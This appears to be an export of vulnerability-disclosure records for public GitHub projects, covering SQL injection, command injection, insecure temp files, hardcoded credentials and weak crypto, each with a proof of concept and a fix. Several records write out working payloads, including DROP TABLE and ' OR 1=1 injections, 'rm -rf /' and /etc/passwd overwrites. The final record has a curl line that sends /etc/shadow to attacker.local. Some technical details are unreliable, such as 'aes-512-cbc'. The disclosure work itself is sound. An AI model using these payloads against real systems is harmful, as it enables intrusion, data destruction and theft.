https://github.com/KOSASIH/PiFinance-Core/blob/main/src/utils/cryptoUtils.js

Line 34: crypto.createCipheriv('aes-512-cbc', ...)
CBC (Cipher Block Chaining) mode alone does not verify that ciphertext was not modified during transit. Attackers could tamper with encrypted data without detection, causing unpredictable behavior or leaks during decryption.

Thus, encryption lacked authentication.

Severity: CRITICAL (4)

The use of insecure cryptographic modes can allow attackers to decrypt, manipulate, or tamper with confidential data without detection. Given that the utilities are for sensitive information (e.g., banking, digital signatures), any cryptographic weakness must be treated as a high-priority security risk.

Root Cause:
The root cause was selecting an encryption algorithm (AES-512-CBC) that lacks built-in integrity verification. CBC requires separate mechanisms (like HMAC) to ensure authentication, which were missing. Without such protections, data tampering remains undetectable and exploitable by attackers.

Exploit Scenario:
An attacker intercepts encrypted traffic between a server and a client. Without authentication, the attacker modifies the encrypted payload and sends it forward. Upon decryption, the server either leaks information through error responses or silently processes corrupted, attacker-controlled data.

This can lead to privilege escalation, information leaks, or full compromise.

Why It Happens:
It happens because CBC mode encrypts blocks sequentially but does not protect the ciphertext’s integrity. Without an accompanying authentication mechanism (like HMAC or GCM mode’s authTag), there’s no verification whether the ciphertext was altered. As a result, modified ciphertexts are processed, causing critical vulnerabilities.

Security Implications:
Successful exploitation can result in:

Confidential data being leaked or manipulated.

Forged messages being accepted as genuine.

Exploitation of cryptographic operations for padding oracle attacks.

Full compromise of cryptographic trust, leading to further system breaches.

Suggested Fix:
Use AES-256-GCM for encryption instead of AES-512-CBC. GCM (Galois/Counter Mode) provides both encryption and built-in integrity protection using an authentication tag.

Correct approach:

const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
const authTag = cipher.getAuthTag();
Always store and verify the authentication tag during decryption to ensure data authenticity and confidentiality."
99,1745767457682,cake-tools/ClickExportTool,CWE-377: Insecure Temporary file,High,2025-04-29T07:06:36.000Z,2025-04-29T07:18:19.000Z,"POC: Insecure Temporary File Handling
Steps to Reproduce
Clone the repository:

git clone https://github.com/cake-tools/ClickExportTool.git

cd ClickExportTool
Configure the application as per the README.md, including populating settings.py.

Run the vulnerable script:

python task_runner.py

Observe that temporary files (temp.csv) are created in the working directory with predictable names and insecure permissions.

Root Cause Analysis
The application creates temporary files in an insecure manner, leading to multiple security risks:

Predictable Filenames (temp.csv):
An attacker can guess the filename and pre-create or overwrite it with malicious content.
This can lead to data corruption, code injection, or privilege escalation if the file is later processed with higher permissions.
World-Writable Directory (Default Working Dir):
Since the file is created in the current working directory (often /tmp or the project root), other users or processes may read, modify, or delete it.

No File Permissions Restriction:
The file is created with default permissions (typically rw-rw-r--), allowing other users on the system to read or modify it.

Vulnerable Code

with open('temp.csv', 'wb') as text_file:  # Predictable name, insecure location
    writer = csv.writer(text_file)

Exploit Scenarios
Race Condition Attack:
An attacker replaces temp.csv with a symlink to a critical system file (/etc/passwd).
When the script writes data, it corrupts system files instead.
Data Theft or Tampering:
A malicious user reads temp.csv to steal sensitive exported data.
Alternatively, they modify the file before the script reads it back, leading to data integrity issues.

Denial of Service (DoS):
An attacker pre-creates temp.csv as a directory, causing the script to crash when trying to write.

Why This Happens
Lack of Secure Temp File APIs: The code manually creates files instead of using tempfile.
No Randomization: Fixed filenames (temp.csv) make attacks trivial.
No Permission Hardening: Files inherit unsafe default permissions.

Security Implications
Exploitation can lead to:
1. Data Corruption (Malicious file overwrites)
2. Information Disclosure (Unauthorized file reads)
3. Privilege Escalation (If script runs as root)
4. Denial of Service (Crash via invalid file handling)
5. Arbitrary File Overwrite (Symlink attacks)

Suggested Fix
Use Python’s built-in tempfile module for secure handling:


import tempfile

# Creates a uniquely named temp file, readable only by the owner
with tempfile.NamedTemporaryFile(
    mode='wb', 
    prefix='clickexport_',  # Custom prefix for debugging
    suffix='.csv', 
    delete=False  # Optional: Keep file after close
) as text_file:
    writer = csv.writer(text_file)
    temp_path = text_file.name  # Store path if needed later

Additional Hardening Steps
Restrict Permissions:

os.chmod(temp_path, 0o600)  # Only owner can read/write

Clean Up Securely:
os.unlink(temp_path)  # Delete when done

Use TMPDIR Environment Variable (For custom secure temp locations)."
100,1745770751518,arindhimar/VideoStreamingPlatform/blob/ANIMEX/BackEnd/models/user.py,CWE-89 :SQL Injection,High,2025-04-27T16:19:11.000Z,2025-04-27T22:59:36.000Z,"Root Cause:
The SQL query directly concatenates user inputs (username and password) into the query string without parameterized queries or input sanitization. This exposes the application to SQL injection attacks, allowing attackers to manipulate the SQL statement execution.

Vulnerable code:
cur.execute(""SELECT * FROM users where username='"" + username + ""' and password='"" + password + ""'"")  # Line 52

Exploit Scenario:
An attacker could input malicious SQL statements such as ' OR 1=1 -- as the username and any string as the password. This would bypass authentication and grant unauthorized access. Similarly, an attacker could extract sensitive data by injecting UNION queries.

Vulnerable code:
cur.execute(""SELECT * FROM users where username='"" + username + ""' and password='"" + password + ""'"")  # Line 52

Why It Happens:
The application does not use secure coding practices like parameterized queries or ORM (Object Relational Mapping) frameworks, which prevent direct injection of user inputs into SQL statements.

Security Implications:
Exploitation can lead to:

Bypassing authentication.
Unauthorized access to sensitive data.
Data corruption or deletion.
Compromise of the database server.

Suggested Fix:
Use parameterized queries instead of string concatenation to prevent SQL injection
cur.execute(""SELECT * FROM users WHERE username = %s AND password = %s"", (username, password))

Consider implementing an ORM (Object-Relational Mapping) framework which handles parameter sanitization automatically.
Apply input validation to ensure that username and password fields contain only expected characters and formats before processing.
Limit database user privileges to only what's necessary for the application to function properly, reducing the potential impact of successful SQL injection attacks."
101,1745771934189,https://github.com/leartgjoni/c-sharp-hospital-crm/blob/master/EPatient/Views/Staff/ReservationDiagnose.cs,"CWE-22, CWE-23",Medium,2025-04-28T04:38:49.000Z,2025-04-28T06:22:29.000Z,"Vulnerability Type:
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
Proof of Concept:
Vulnerable Code:
var filePath = ofd.FileName;
FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
Explanation:
The code uses the file path directly from the OpenFileDialog without validating it. An attacker could manipulate the file path to open sensitive system files.
Solution:
Validate the file path to ensure it resides within an allowed directory and check the file extension before opening it.
Example fix:
string[] allowedExtensions = { "".pdf"", "".docx"", "".png"", "".jpg"" };
string extension = Path.GetExtension(filePath).ToLower();

if (!allowedExtensions.Contains(extension))
{
    MessageBox.Show(""Unsupported file type."");
    return;
}

using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
{
    byte[] file = new byte[stream.Length];
    stream.Read(file, 0, file.Length);
    FileUploaded.FileBytes = file;
}

Severity: High

Root Cause:
The application trusts the file path selected through OpenFileDialog without verifying or sanitizing it, allowing arbitrary files to be accessed or read if the dialog is bypassed or compromised.

Exploit Scenario:
An attacker could select a critical system file, like C:\Windows\System32\drivers\etc\hosts, during upload. The application would read and store this file without restriction, leaking sensitive system configuration data.

Why It Happens:
The vulnerability occurs because the code directly uses user-supplied file paths without enforcing validation rules or restricting file access to safe directories.

Security Implications:
If exploited, attackers could access, leak, or upload sensitive system files, causing potential data breaches, unauthorized access to configuration files, or corruption of application data.

Suggested Fix:
diff --git a/EPatient/Views/Staff/ReservationDiagnose.cs b/EPatient/Views/Staff/ReservationDiagnose.cs
index abcdef1..1234567 100644
--- a/EPatient/Views/Staff/ReservationDiagnose.cs
+++ b/EPatient/Views/Staff/ReservationDiagnose.cs
@@ private void btnUpload_Click(object sender, EventArgs e)
-        private void btnUpload_Click(object sender, EventArgs e)
-        {
-            using (OpenFileDialog ofd = new OpenFileDialog(){Multiselect = false, ValidateNames = true})
-            {
-                if (ofd.ShowDialog() == DialogResult.OK)
-                {
-                    var filePath = ofd.FileName;
-                    FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
-                    int intLength = Convert.ToInt32(stream.Length);
-                    byte[] file = new byte[intLength];
-                    stream.Read(file, 0, intLength);
-                    stream.Close();
-                    FileUploaded.FileBytes = file;
-                    string[] strPath = filePath.Split(Convert.ToChar(@""\""));
-                    FileUploaded.FileName = strPath[strPath.Length - 1];
-                    btnUpload.Enabled = false;
-                }
-            }
-        }
+        private void btnUpload_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog() { Multiselect = false, ValidateNames = true })
+            {
+                if (ofd.ShowDialog() == DialogResult.OK)
+                {
+                    var filePath = ofd.FileName;
+                    var allowedExtensions = new string[] { "".pdf"", "".docx"", "".png"", "".jpg"", "".jpeg"" };
+                    var extension = Path.GetExtension(filePath).ToLower();
+
+                    if (!allowedExtensions.Contains(extension))
+                    {
+                        MessageBox.Show(""Unsupported file type. Please upload a valid document or image."");
+                        return;
+                    }
+
+                    using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+                    {
+                        byte[] file = new byte[stream.Length];
+                        stream.Read(file, 0, file.Length);
+                        FileUploaded.FileBytes = file;
+                    }
+                    FileUploaded.FileName = Path.GetFileName(filePath);
+                    btnUpload.Enabled = false;
+                }
+            }
+        }
"
102,1745774292373,https://github.com/pritipsingh/formData/blob/main/src/Components/Upload.jsx,CWE- 434,High,2025-04-27T17:18:12.000Z,2025-04-28T05:17:37.000Z,"Vulnerability Type:
CWE-434: Unrestricted Upload of File with Dangerous Type

The application allows uploading files without verifying their actual type.

Proof of Concept:
Vulnerable Code:

<input
  type=""file""
  accept=""image/*""
  onChange={handleFileChange}
/>
Explanation:

The application only checks if the file input accepts image/* through the browser hint.

It does not verify the real file type (MIME type) or check the file content (""magic bytes"").

A malicious file (e.g., .php or .exe) renamed as .jpg can be uploaded successfully.

Steps:

Create a text file and save it as malicious.jpg.

Upload it using the upload field.

The application accepts it without verifying if it's really an image.

Severity:
High
(If combined with server misconfiguration, can lead to remote code execution.)

Root Cause:
The vulnerability arises because the code trusts the file extension and client-side MIME type hints without server-side or actual file content validation. This allows malicious non-image files to be uploaded undetected.

Exploit Scenario:
An attacker can upload a fake .jpg file containing malicious code (like a PHP webshell or a JavaScript payload). If the backend stores and executes it, the attacker can gain full server control, access sensitive files, or deface the website.

Why It Happens:
The application assumes that files selected by the user are safe if their extension or MIME type matches expected types (e.g., image/jpeg). However, file extensions and Content-Type headers can be spoofed easily by attackers, and without deep inspection, the system trusts unsafe files.

Security Implications:
If exploited, the attacker can:

Upload executable malware.

Perform remote code execution.

Steal sensitive data from the server.

Deface or destroy application content.

Use the server as a pivot point to attack internal networks.

This can lead to complete compromise of the web application and infrastructure.

Suggested Fix:
Validate file types strictly on the server side, not just client-side.

Verify the file's magic numbers to confirm it matches expected file types (e.g., JPEG starts with FFD8).

Restrict accepted file types to a whitelist.

Reject or quarantine suspicious files immediately.

Set safe permissions and scan uploads using malware scanners if necessary.

Example frontend validation:


const allowedTypes = ['image/jpeg', 'image/png'];
if (!allowedTypes.includes(file.type)) {
  alert('Invalid file type. Only JPEG or PNG allowed.');
}
Example backend validation:

# Python (Django) example
if not uploaded_file.content_type.startswith('image/'):
    return HttpResponseForbidden(""Invalid file type."")"
103,1745774648191,https://github.com/aks13raut/GUI-for-Food-ordering-System,CWE-798,High,2025-04-27T17:24:08.000Z,2025-04-28T03:56:19.000Z,"Explanation:
The affected asset has hardcoded credentials for the database server. The credentials exposed belong to a super user / Administrator. This leads to complete database compromise and exposure to sensitive information.

POC:
The following line hardcodes sensitive credentials:

conn = pymysql.connect(host=""localhost"",user=""root"",password=""root123"",db=""foodmenu"")


Root Cause :
Line at the end of the script shop.py:
conn = pymysql.connect(host=""localhost"",user=""root"",password=""root123"",db=""foodmenu"")

Exploit Scenario:
If the code is leaked (e.g., via version control or backups), attackers can access the database with full privileges.

Why it Happens:
Credentials are embedded in source code instead of being loaded from a secure environment variable or configuration file.

Security Implications:
Full database compromise
Potential for lateral movement within the network

Suggested Fix:
Use environment variables or a secure configuration file to store credentials.

Patch:

python
import os

mydb=mysql.connector.connect(
    host=os.environ['DB_HOST'],
    user=os.environ['DB_USER'],
    passwd=os.environ['DB_PASS'],
    database=os.environ['DB_NAME']
)"
104,1745775084929,https://github.com/aks13raut/GUI-for-Food-ordering-System/tree/master,CWE-89,High,2025-04-27T17:31:24.000Z,2025-04-28T03:53:52.000Z,"Explanation:
The shop.py code contains SQL Injection due to unsanitized user input being directly concatenated into SQL queries. This allows attackers to execute arbitrary SQL statements, potentially leading to data theft, modification, or even complete database compromise.

POC:
Suppose a user sets the shop name to MyShop; DROP TABLE login_details; --. When the following line executes:

sqlQuery = ""SELECT * FROM ""+self.name+""_menu""


It becomes:

SELECT * FROM MyShop; DROP TABLE login_details; --_menu

This would drop the login_details table if the database allows multiple statements.


Root Cause: Shop.py File

Line 94 (getMenu):

sqlQuery = ""SELECT * FROM ""+self.name+""_menu""
curs.execute(sqlQuery)
Here, self.name is derived from user input, making the query vulnerable to SQL injection.

Line 215 (submit_order):

sqlQuery = ""UPDATE ""+self.name+""_menu SET rank=""+repr(food.rank+qnty)+"" WHERE food=""+repr(food.name)
curs.execute(sqlQuery)
Again, self.name and food.name are not sanitized.

Line 312 (savemenu):

sqlQuery = ""DELETE FROM ""+self.name+""_menu""
curs.execute(sqlQuery)
and

sqlQuery = ""INSERT INTO ""+self.name+""_menu VALUES(""+repr(food.name)+"", ""+repr(food.price)+"", ""+repr(food.rank)+"");""
curs.execute(sqlQuery)
Both use unsanitized user input for table and value names.

Exploit Scenario:
An attacker could input a malicious shop name or food name such as MyShop; DROP TABLE login_details; -- which would cause the application to execute unintended SQL commands, leading to data loss or corruption.

Why it Happens:
The code directly concatenates user-controlled input into SQL queries without any sanitization or use of parameterized queries. This allows attackers to inject arbitrary SQL code.


Security Implications:
Data Breach: Attackers could read sensitive data from the database.
Data Loss: Attackers could drop tables, delete data, or corrupt the database.
Privilege Escalation: Attackers could modify authentication data or escalate privileges.


Suggested Fix:
Never concatenate user input directly into SQL queries.
Use parameterized queries for all SQL statements.
Validate and sanitize all user input, especially when constructing table or column names.


Patch fix for getMenu:

def getMenu(self):
    self.menu = foodmenu.Menu()
    # Only allow alphanumeric and underscores in table names
    if not re.match(r'^\w+$', self.name):
        raise ValueError(""Invalid shop name"")
    table_name = f""{self.name}_menu""
    sqlQuery = f""SELECT * FROM `{table_name}`""
    curs.execute(sqlQuery)
    foods = curs.fetchall()
    for values in foods:
        food = foodmenu.Food(*values)
        self.menu.add(food)
    self.menu.reduceRanks()

Use a regular expression to validate self.name.
Use backticks to quote table names and prevent injection.

For queries with values, always use placeholders:

sqlQuery = f""UPDATE `{table_name}` SET rank=%s WHERE food=%s""
curs.execute(sqlQuery, (food.rank+qnty, food.name))"
105,1745776376115,https://github.com/IamLucif3r/Chat-On/tree/main,"CWE-319, CWE-829",Low,2025-04-28T12:49:43.000Z,2025-04-28T23:57:56.000Z,"As per the feedback, I am merging the two findings into one, and also pointing out the filename in the explanation below:
=================================================================

Bug -1 CWE-319

Explanation: The server uses plain TCP sockets without encryption, so all messages and commands are sent in clear text over the network. This allows anyone on the same network to sniff the traffic and read sensitive information such as nicknames, admin commands, and passwords.


POC: Use a network packet sniffer (e.g., Wireshark) on the same network to capture the traffic between client and server; observe that all data, including the admin password ""adminpass"", is transmitted in plaintext.


Root Cause: Server.py
Line 1-4 in server.py: Use of socket.socket(socket.AF_INET, socket.SOCK_STREAM) without any encryption layer.
Lines handling messages (handle function) and authentication (receive function) transmit data directly over the socket without encryption.


Exploit Scenario: An attacker on the same local network can sniff the TCP packets and obtain the admin password or other chat messages, enabling unauthorized access or eavesdropping.


Why it Happens: The code does not implement any encryption or secure transport layer protocols like TLS/SSL for the socket communication.

Security Implications: Exposure of sensitive data (passwords, chat messages) to network attackers; potential unauthorized admin access.


Suggested Fix: Use Python's ssl module to wrap the socket with TLS for encrypted communication.
Patch: 

import ssl

# Wrap the server socket with SSL
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile='server.crt', keyfile='server.key')

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen()

# Accept connections with SSL wrapping
def receive():
    while True:
        client_socket, address = server.accept()
        ssl_client = context.wrap_socket(client_socket, server_side=True)
        # Proceed using ssl_client instead of client_socket
=================================================================
Bug - 2 CWE-829


Explanation:
The server trusts client-sent nicknames and commands without sanitization or validation, allowing clients to send commands like KICK or BAN if they spoof the admin nickname or manipulate protocol messages.

POC:
A client can send a nickname ""admin"" and attempt to send KICK or BAN commands. Although password is checked, the lack of strong authentication and validation can be exploited if password checks fail or are bypassed.

Root Cause: Server.py
Lines ~26-37 in server.py, where messages are parsed and commands executed based on nickname:

if nicknames[clients.index(client)] == 'admin':
    # execute kick/ban


Exploit Scenario:
If authentication is weak or bypassed, unauthorized users can issue administrative commands.


Why it Happens:
No robust authentication or message validation protocol is implemented.


Security Implications:
Unauthorized administrative actions can disrupt chat service and user experience.


Suggested Fix:
Implement stronger authentication mechanisms.
Use session tokens or certificates rather than relying on nickname strings.
Validate and sanitize all client inputs strictly.

Modify the receive() function to set authentication state:

def receive():
    while True:
        client, address = server.accept()
        print(f""Connected with {str(address)}"")
        client.send('NICK'.encode('ascii'))
        nickname = client.recv(1024).decode('ascii')

        with open('bans.txt', 'r') as f:
            bans = f.readlines()

        if nickname + '\n' in bans:
            client.send('BAN'.encode('ascii'))
            client.close()
            continue

        is_admin = False
        if nickname == 'admin':
            client.send('PASS'.encode('ascii'))
            password = client.recv(1024).decode('ascii')
            if password != 'adminpass':
                client.send('REFUSE'.encode('ascii'))
                client.close()
                continue
            is_admin = True

        nicknames.append(nickname)
        clients.append(client)
        client_auth[client] = {'nickname': nickname, 'is_admin': is_admin}

        print(f'Nickname of the client is {nickname}')
        broadcast(f'{nickname} joined the Chat'.encode('ascii'))
        client.send('Connected to the Server!'.encode('ascii'))

        thread = threading.Thread(target=handle, args=(client,))
        thread.start()"
106,1745777391918,https://github.com/TusharKukra/LMS-Library-Management-System,CWE-840,Medium,2025-04-27T18:09:51.000Z,2025-04-28T06:21:13.000Z,"C++ Library Management System - Logical Flaws in Book Management

---

Affected Components:  
- `bookissue()` and `bookdeposit()` functions in `LMSCode.cpp`  
- `book` and `student` class logic  

---

Root Cause:  
1. Missing Book Status Tracking:  
   The `book` class lacks an `issued` flag or copy counter, allowing the same book to be issued to multiple students.  
2. Incorrect Fine Calculation:  
   The formula `(day-15)*1` in `bookdeposit()` hardcodes a 1 Rs/day fine instead of 15 Rs/day.  
3. No Validation for Returns:  
   Students can return books they never borrowed, corrupting the `token` system.  
4. Unrestricted Token Logic:  
   The `token` variable is not linked to actual book availability, enabling over-issuance and invalid returns.  

---

Exploit Scenarios:  
1. Duplicate Book Issuance:  
1. Admin creates a book (`bno = ""B101""`).  
2. Student A (`admno = ""S001""`) issues `B101` successfully.  
3. Student B (`admno = ""S002""`) issues `B101` again.  
Result: Both students hold the same book, leading to inventory chaos.  
2. Financial Loss via Incorrect Fines:  
1. Student returns a book after 20 days.  
2. System calculates fine as `(20-15)*1 = 5 Rs` instead of `(20-15)*15 = 75 Rs`.  
Result: Financial loss due to undercharging.  

3. Invalid Book Returns:  
1. Student `S001` (with no issued books) selects ""Book Deposit"".  
2. System resets their `token` to `0` despite no prior issuance.  
Result: Data inconsistency in `student.dat`.  

---

Why It Happens:  
- No Book Status: The `book` class does not track issuance state.  
- Hardcoded Fine Logic:  
  ```cpp
  // Flawed calculation in bookdeposit()
  fine = (day-15)*1; // Should be (day-15)*15
  ```  
- Lax Token Checks:  
  ```cpp
  // Missing validation in bookdeposit():
  if (token == 1) { ... } // No check for actual book ownership
  ```  

---

Security Implications:  
- Data Corruption: Inventory mismanagement due to duplicate issuance.  
- Financial Loss: Incorrect fines undercharge users.  
- Operational Failure: Invalid returns/issuances make the system unreliable.  

---

Suggested Fixes:  
1. Add Book Status Tracking:  
   ```cpp
   class book {
     // ...
     bool issued; // New field
     int copies;  // Track available copies
   };
   ```  
2. Validate Book Availability:  
   ```cpp
   // In bookissue():
   if (bk.copies > 0) {
     bk.copies--; // Decrement on issuance
     st.addtoken();
   } else {
     cout << ""Book unavailable!"";
   }
   ```  
3. Correct Fine Calculation:  
   ```cpp
   fine = (day > 15) ? (day - 15) * 15 : 0;
   ```  
4. Enforce Return Validation:  
   ```cpp
   // In bookdeposit():
   if (st.rettoken() == 0) {
     cout << ""No book issued!"";
     return;
   }
   ```  

---


Proof of Concept (PoC):  
Steps:  
1. Create a Book:  
   - `bno = ""B101""`, `copies = 1` (if implemented).  
2. Issue to Student A:  
   - `S001` issues `B101` (successful).  
3. Issue to Student B:  
   - `S002` issues `B101` (successful if no copy tracking).  
4. Return After 20 Days:  
   - Fine displayed: 5 Rs (incorrect).  

Output:  
```plaintext
Book B101 issued to S001  
Book B101 issued to S002  <-- Flaw: Duplicate issuance  
Fine for S001: 5 Rs       <-- Flaw: Should be 75 Rs  
```  

---
Mitigation:  
Implement the fixes above to ensure:  
- Books cannot be over-issued.  
- Fines reflect the correct rate.  
- Returns require valid prior issuance."
107,1745777456794,0xFrapples/spfm,CWE-78,Critical,2025-04-27T18:10:56.000Z,2025-04-27T18:43:20.000Z,"Explanation: The code uses os.system() with string concatenation of user-controlled inputs without sanitization or validation, allowing arbitrary command injection.


POC:
If an attacker inputs a filename such as ""; rm -rf / # during the delete (//del) command, the constructed command becomes:
rm -rf /root/""; rm -rf / #
which executes the dangerous rm -rf / command, potentially wiping the system.


Root Cause:

spfm.py:
Line 103: os.system(f'rm -rf {currentDir}/{r1}')
Line 117: os.system(f'cd {currentDir} && cp {r1} {r2} && rm -rf {r1}')

Both use unsanitized user input r1 and r2 directly in shell commands.


Exploit Scenario:
An attacker inputs malicious filenames or directory names containing shell metacharacters to execute arbitrary commands with the privileges of the running script.


Why it Happens:
Lack of input validation and use of os.system() with string formatting allows shell injection.


Security Implications:
Full system compromise, data loss, privilege escalation, or denial of service.


Suggested Fix:
Use Python's subprocess module with argument lists to avoid shell interpretation:

import subprocess

# For delete
subprocess.run(['rm', '-rf', os.path.join(currentDir, r1)], check=True)

# For rename (copy + delete)
subprocess.run(['cp', os.path.join(currentDir, r1), os.path.join(currentDir, r2)], check=True)
subprocess.run(['rm', '-rf', os.path.join(currentDir, r1)], check=True)"
108,1745778403676,https://github.com/gaetanBloch/nodejs-shopping,CWE-521,Very Low,2025-04-27T18:26:43.000Z,2025-04-28T03:44:45.000Z,"Vulnerability Type
CWE-521: Weak Password Requirements

Proof of Concept
In the file ./routes/auth.js there is this code-

return body('password', 'Please enter a password with only numbers and ' +
    'text and at least 5 characters.')
    .isLength({ min: 5 })
    .isAlphanumeric()
    .trim();
};

Here the password is being tested whether it is 5 characters long and is made up of alphanumeric characters. This is not secure as this allows simple passwords like '12345' and 'password' to be acccepted by the application. These passwords can be guessed/brute forced and can lead to account compromise.

Severity
1

Root Cause
Insufficient backend-side checks for minimum password complexity (length, digits, uppercase, special characters).

Exploit Scenario
The attackers can brute force the accounts using list of simple passwords and there is some chance that they may get an account password and then compromise it.

Why it Happens?
Developers assume users will choose strong passwords on their own, or rely only on client-side checks.

Security Implications
Account takeovers because this vulenrability makes it easier to brute-force passwords.

Suggested fix
Enforce strong passwords on server side (length + complexity) like-
    Minimum 8 characters
    At least one lowercase letter
    At least one uppercase letter
    At least one digit
    At least one special character"
109,1745778472698,https://github.com/heli-toon/LBSHS-LMS,CWE-89,High,2025-04-27T18:27:52.000Z,2025-04-28T03:46:51.000Z,"SQL Injection in returnbooks() → return_record()
Summary
The SQL injection vulnerability in the returnbooks() → return_record() method allows attackers to inject malicious SQL code into the deletion query. This could lead to unauthorized data deletion, database corruption, or complete system compromise if exploited.

Description
The return_record() function in the returnbooks() module constructs a SQL query by directly concatenating user-controlled input (stored_id) into the statement. The vulnerable code is:

python
cursor.execute(""DELETE from issues where oid="" + stored_id)  # SQL Injection here
Since stored_id is derived from the selected row in the Treeview (which can be manipulated by an attacker), this allows arbitrary SQL execution. For example:

sql
1; DROP TABLE issues; --
This payload would delete the entire issues table.

Impact
Unauthorized Data Deletion:

Attackers can delete critical records or entire tables (e.g., DELETE FROM books;).

Database Corruption:

Malicious commands like DROP TABLE can erase schema structures.

Privilege Escalation:

If the database user has elevated privileges, attackers could execute OS commands (e.g., COPY to write files).

Proof of Concept (PoC)
Payload:

sql
1; DROP TABLE issues; --  
Exploited Query:

sql
DELETE FROM issues WHERE oid=1; DROP TABLE issues; --  
Result:

The issues table is permanently deleted.

Steps to Reproduce
Log in as Admin:

Use credentials masteradmin/m@$+erp@$$w0rd.

Add Malicious Entry to issues Table:

Navigate to Issue Books.

Set Ascension No to 1; DROP TABLE issues; --.

Fill other fields (e.g., Book Title: Hacked, Issued To: Attacker).

Click Submit.

Trigger the Exploit:

Go to Return Books.

Select the malicious entry with Ascension No = 1; DROP TABLE issues; --.

Click Return.

Verify Exploitation:

Check if the issues table is deleted (e.g., attempt to view issued books).

Recommended Fix
1. Use Parameterized Queries
Replace the insecure code with:

python
cursor.execute(""DELETE FROM issues WHERE oid=?"", (stored_id,))  
2. Input Validation
Ensure stored_id is numeric:

python
if not stored_id.isdigit():  
    raise ValueError(""Invalid ascension number"")  
3. Least Privilege Principle
Restrict the database user’s permissions to prevent DROP/ALTER commands."
110,1745779788259,https://github.com/warlordthesaviour/GeekWars,CWE-89,Critical,2025-04-27T18:49:48.000Z,2025-04-28T06:32:29.000Z,"Vulnerability Type:
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Proof of Concept:
Here is the vulnerable code in question:

const userExist = (username, cb) => query.select(`SELECT count(id) from users where username = '${username}'`, cb);
Step-by-step Explanation:
In this case, the query directly embeds user input (username) into the SQL string without sanitizing it. An attacker could exploit this by submitting the following malicious input as the username:

""rahul""; DROP TABLE users; --""
This will modify the SQL query as follows:

SELECT count(id) from users where username = 'rahul'; DROP TABLE users; --';
What happens here:

The first part of the query (SELECT count(id) from users where username = 'rahul';) will execute normally and return the result for the username ""rahul"".

The second part (DROP TABLE users;) is injected into the query. This SQL statement is executed after the first part and will attempt to drop (delete) the entire users table from the database.

The -- marks the rest of the query as a comment, effectively ignoring any subsequent SQL code, which prevents errors from the rest of the original query.

As a result, the attacker not only bypasses the logic intended to check if the user exists but also deletes the entire users table, leading to a catastrophic loss of data.

Severity:Critical


Root Cause:
The root cause of this vulnerability is the direct inclusion of user input into SQL queries without proper validation or sanitization. By concatenating the username directly into the query string, the application allows malicious users to inject arbitrary SQL commands. The lack of proper input sanitization or the use of parameterized queries results in the system treating the user input as part of the SQL statement, which attackers can manipulate for harmful purposes. This flaw is common in applications that dynamically generate SQL queries based on user input.

Exploit Scenario:
In this scenario, an attacker submits the following username as input:

""rahul""; DROP TABLE users; --""
This input alters the query, causing the following sequence of events:

The first part of the query will check if the username ""rahul"" exists, which could return a valid result.

The second part of the injected input, DROP TABLE users;, will execute after the initial query and will delete the users table from the database.

The -- comment syntax ensures that the rest of the query (if any) is ignored, preventing errors or unintended consequences in the query's execution.

This could allow the attacker to cause significant damage to the database, such as deleting user data or completely wiping important tables, leading to a major disruption of service.

Why It Happens:
This vulnerability occurs because the application constructs SQL queries by directly embedding user input into the query string, without validating or sanitizing the input. SQL queries need to treat user input as data rather than executable code to prevent an attacker from altering the query’s logic. The failure to separate user input from SQL statements and the reliance on manual concatenation rather than using parameterized queries is what enables the attacker to inject arbitrary SQL commands and exploit the vulnerability.

Security Implications:
The exploitation of this vulnerability can lead to severe security consequences. An attacker can manipulate the SQL query to execute malicious commands, such as:

Dropping tables (DROP TABLE), resulting in loss of data and potentially a critical part of the application’s functionality.

Reading sensitive data (e.g., passwords, emails, personal information) by altering the query to retrieve data from other tables.

Modifying or deleting records from the database, leading to data corruption, unauthorized access, or even the complete destruction of the database.

Escalating privileges to gain full administrative access, depending on the database configuration and permissions.

In a worst-case scenario, the attacker could gain full control over the database, compromising the integrity of the application and its data.

Suggested Fix:
To resolve this issue, the code should use parameterized queries or prepared statements to ensure that user input is treated as data, not part of the query. This method separates the SQL code from the data and prevents any user input from being executed as part of the SQL statement. Here's an example of how to fix the vulnerable query:

const userExist = (username, cb) => query.select('SELECT count(id) from users where username = $1', [username], cb);
By using $1 as a placeholder and passing the username as a parameter (instead of embedding it directly into the query string), the database will safely handle the user input. This ensures that the input is treated as a value and not executable SQL code, effectively preventing SQL injection attacks. Parameterized queries are the industry-standard approach to preventing SQL injection and should be used throughout the application."
111,1745786546874,https://github.com/NginxProxyManager/nginx-proxy-manager.git,CWE-78,Critical,2025-04-28T05:42:42.000Z,2025-04-29T03:14:00.000Z,"Overview:
Nginx Proxy Manager versions up to 2.11.2 include a command-injection flaw in the file backend/internal/certificate.js. An attacker who can supply DNS provider credentials through the certificate-management interface can inject shell commands that run on the host with the same privileges as the Proxy Manager process.

Vulnerability details:
In the vulnerable code the application takes the user-supplied credentials string and “escapes” single quotes by replacing each ‘ with \’ and each backslash with \ . It then builds a shell command string of the form
mkdir -p /etc/letsencrypt/credentials; echo '…escaped credentials…' > /etc/letsencrypt/credentials/credentials-ID && chmod 600 …
and passes that string to a shell via utils.exec(). Because in POSIX shells backslashes do not escape single quotes inside a single-quoted string, an attacker can include a literal single quote in the credentials value, break out of the quoted echo, insert arbitrary commands, then reopen the quote. Those commands execute immediately on the server.

Exploitation scenarios:

Create an arbitrary file: supply credentials ending in
apikey'); touch /tmp/pwned; echo '
The server will run touch /tmp/pwned, creating that file.

Blind delay: supply
token'); sleep 5; echo '
The certificate-request call will pause about five seconds, proving code execution even if output is suppressed.

Overwrite a system file: supply
creds'); echo HACKED > /etc/passwd; echo '
This will replace /etc/passwd contents with “HACKED,” potentially locking out users.

Destructive deletion: supply
xyz'); rm -rf /var/www/html; echo '
All hosted web content under /var/www/html will be removed.

Data exfiltration: supply
secret'); curl http://attacker.local/$(cat /etc/shadow) >/dev/null; echo '
